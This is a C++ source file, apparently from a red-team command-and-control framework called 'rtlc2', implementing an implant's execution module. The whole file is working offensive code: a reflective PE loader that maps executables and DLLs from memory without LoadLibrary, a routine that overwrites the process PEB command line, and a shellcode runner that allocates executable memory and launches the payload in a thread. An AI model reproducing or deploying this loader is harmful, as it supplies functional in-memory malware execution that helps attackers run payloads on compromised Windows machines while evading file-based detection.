// Reflective PE Loader - Load PE files from memory without LoadLibrary
// Manually maps sections, resolves imports, applies relocations
#include "execution.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <string>
#include <vector>

namespace rtlc2 {
namespace execution {

// ============================================================================
// PEB structures for command-line patching
// These minimal definitions allow us to access and modify the
// ProcessParameters->CommandLine field in the PEB so that loaded
// EXEs see the correct command-line arguments.
// ============================================================================

// UNICODE_STRING used by ProcessParameters
typedef struct _RTLC2_UNICODE_STRING {
    USHORT Length;        // Length in bytes (not including null terminator)
    USHORT MaximumLength; // Total buffer size in bytes
    PWSTR  Buffer;
} RTLC2_UNICODE_STRING;

// Minimal RTL_USER_PROCESS_PARAMETERS layout
// We only need the fields up to CommandLine
typedef struct _RTLC2_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StdInputHandle;
    HANDLE StdOutputHandle;
    HANDLE StdErrorHandle;
    RTLC2_UNICODE_STRING CurrentDirectoryPath;
    HANDLE CurrentDirectoryHandle;
    RTLC2_UNICODE_STRING DllPath;
    RTLC2_UNICODE_STRING ImagePathName;
    RTLC2_UNICODE_STRING CommandLine;
} RTLC2_PROCESS_PARAMETERS;

// Minimal PEB layout (we only need ProcessParameters pointer)
typedef struct _RTLC2_PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
#ifdef _WIN64
    BYTE Reserved3[4];
#endif
    PVOID Reserved4[2]; // Mutant, ImageBaseAddress
    PVOID Ldr;          // PEB_LDR_DATA*
    RTLC2_PROCESS_PARAMETERS* ProcessParameters;
    // ... more fields follow but we don't need them
} RTLC2_PEB;

// Patch the PEB's ProcessParameters->CommandLine with the given arguments string.
// This makes GetCommandLineW/A and the CRT's argc/argv see our custom arguments.
static void PatchPebCommandLine(const std::string& arguments) {
    if (arguments.empty()) return;

    // Read the PEB pointer from the TEB (Thread Environment Block)
#ifdef _WIN64
    RTLC2_PEB* peb = (RTLC2_PEB*)__readgsqword(0x60);
#else
    RTLC2_PEB* peb = (RTLC2_PEB*)__readfsdword(0x30);
#endif

    if (!peb || !peb->ProcessParameters) return;

    RTLC2_PROCESS_PARAMETERS* params = peb->ProcessParameters;

    // Convert arguments to wide string
    int wideLen = MultiByteToWideChar(CP_ACP, 0, arguments.c_str(), -1, NULL, 0);
    if (wideLen <= 0) return;

    // Allocate buffer for the new command line (must persist for process lifetime)
    // Use HeapAlloc from the process heap for a stable allocation
    size_t bufSize = (size_t)wideLen * sizeof(WCHAR);
    PWSTR newCmdLine = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
    if (!newCmdLine) return;

    MultiByteToWideChar(CP_ACP, 0, arguments.c_str(), -1, newCmdLine, wideLen);

    // Overwrite CommandLine UNICODE_STRING in ProcessParameters
    // Length does not include the null terminator
    params->CommandLine.Length = (USHORT)((wideLen - 1) * sizeof(WCHAR));
    params->CommandLine.MaximumLength = (USHORT)(wideLen * sizeof(WCHAR));
    params->CommandLine.Buffer = newCmdLine;
}

// Manual map a PE into memory
static PVOID ManualMapPE(const uint8_t* peData, size_t peSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    // Allocate memory at preferred base or any address
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    PVOID baseAddr = VirtualAlloc((PVOID)nt->OptionalHeader.ImageBase,
                                   imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!baseAddr) {
        baseAddr = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!baseAddr) return nullptr;

    // Copy headers
    memcpy(baseAddr, peData, nt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            PVOID dest = (BYTE*)baseAddr + section[i].VirtualAddress;
            memcpy(dest, peData + section[i].PointerToRawData, section[i].SizeOfRawData);
        }
    }

    // Process relocations if base address differs
    ULONGLONG delta = (ULONGLONG)baseAddr - nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        DWORD relocRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (relocRVA && relocSize) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)baseAddr + relocRVA);
            while ((BYTE*)reloc < (BYTE*)baseAddr + relocRVA + relocSize && reloc->VirtualAddress) {
                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)(reloc + 1);

                for (DWORD j = 0; j < numEntries; j++) {
                    WORD type = entries[j] >> 12;
                    WORD offset = entries[j] & 0xFFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* pAddr = (ULONGLONG*)((BYTE*)baseAddr + reloc->VirtualAddress + offset);
                        *pAddr += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pAddr = (DWORD*)((BYTE*)baseAddr + reloc->VirtualAddress + offset);
                        *pAddr += (DWORD)delta;
                    }
                }

                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    // Resolve imports
    DWORD importRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)baseAddr + importRVA);
        while (importDesc->Name) {
            const char* dllName = (const char*)((BYTE*)baseAddr + importDesc->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                importDesc++;
                continue;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddr + importDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA iat = (PIMAGE_THUNK_DATA)((BYTE*)baseAddr + importDesc->FirstThunk);

            if (!importDesc->OriginalFirstThunk)
                thunk = iat;

            while (thunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    iat->u1.Function = (ULONGLONG)GetProcAddress(hDll,
                        MAKEINTRESOURCEA(IMAGE_ORDINAL(thunk->u1.Ordinal)));
                } else {
                    PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)
                        ((BYTE*)baseAddr + thunk->u1.AddressOfData);
                    iat->u1.Function = (ULONGLONG)GetProcAddress(hDll, import->Name);
                }
                thunk++;
                iat++;
            }
            importDesc++;
        }
    }

    // Set section permissions
    section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READONLY;
        DWORD chars = section[i].Characteristics;

        if (chars & IMAGE_SCN_MEM_EXECUTE) {
            if (chars & IMAGE_SCN_MEM_WRITE) protect = PAGE_EXECUTE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ) protect = PAGE_EXECUTE_READ;
            else protect = PAGE_EXECUTE;
        } else if (chars & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        }

        DWORD oldProtect;
        VirtualProtect((BYTE*)baseAddr + section[i].VirtualAddress,
                       section[i].Misc.VirtualSize, protect, &oldProtect);
    }

    // Execute TLS callbacks
    DWORD tlsRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tlsRVA) {
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((BYTE*)baseAddr + tlsRVA);
        if (tls->AddressOfCallBacks) {
            PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
            while (*callbacks) {
                (*callbacks)(baseAddr, DLL_PROCESS_ATTACH, NULL);
                callbacks++;
            }
        }
    }

    return baseAddr;
}

PEResult ExecutePE(const std::vector<uint8_t>& pe_data,
                   const std::string& arguments,
                   bool fork_and_run) {
    PEResult result = { false, "", -1 };

    if (pe_data.size() < sizeof(IMAGE_DOS_HEADER)) {
        result.output = "Invalid PE data";
        return result;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_data.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        result.output = "Not a valid PE file";
        return result;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe_data.data() + dos->e_lfanew);
    bool isDLL = (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;

    PVOID mappedBase = ManualMapPE(pe_data.data(), pe_data.size());
    if (!mappedBase) {
        result.output = "Failed to map PE";
        return result;
    }

    PIMAGE_NT_HEADERS mappedNt = (PIMAGE_NT_HEADERS)((BYTE*)mappedBase + dos->e_lfanew);

    if (isDLL) {
        // Call DllMain
        typedef BOOL(WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t pDllMain = (DllMain_t)((BYTE*)mappedBase + mappedNt->OptionalHeader.AddressOfEntryPoint);
        pDllMain((HINSTANCE)mappedBase, DLL_PROCESS_ATTACH, NULL);
        result.success = true;
        result.output = "DLL loaded and DllMain called";
    } else {
        // Patch the PEB's ProcessParameters->CommandLine so the loaded EXE
        // sees the correct arguments via GetCommandLineW/A and CRT argc/argv
        if (!arguments.empty()) {
            PatchPebCommandLine(arguments);
        }

        // Call entry point for EXE
        typedef int(*EntryPoint_t)();
        EntryPoint_t pEntry = (EntryPoint_t)((BYTE*)mappedBase + mappedNt->OptionalHeader.AddressOfEntryPoint);

        __try {
            result.exit_code = pEntry();
            result.success = true;
            result.output = "PE executed, exit code: " + std::to_string(result.exit_code);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            result.output = "PE execution caused exception: 0x" + std::to_string(GetExceptionCode());
        }
    }

    return result;
}

// Shellcode execution
bool ExecuteShellcode(const uint8_t* shellcode, size_t size, bool new_thread) {
    if (!shellcode || !size) return false;

    PVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return false;

    memcpy(mem, shellcode, size);

    DWORD oldProtect;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);

    if (new_thread) {
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        if (!hThread) {
            VirtualFree(mem, 0, MEM_RELEASE);
            return false;
        }
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        typedef void(*ShellcodeFunc)();
        ((ShellcodeFunc)mem)();
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

} // namespace execution
} // namespace rtlc2

#endif // RTLC2_WINDOWS
